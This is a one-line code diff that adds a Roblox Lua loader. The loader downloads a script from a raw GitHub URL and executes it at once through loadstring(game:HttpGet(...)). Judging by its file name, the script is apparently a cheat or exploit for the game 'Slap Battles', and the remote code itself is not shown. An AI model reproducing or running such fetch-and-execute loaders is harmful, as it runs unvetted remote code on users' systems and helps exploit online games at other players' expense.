@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/update-slap-battles-spam0-i1f4d7v4mdcb23.lua"))()
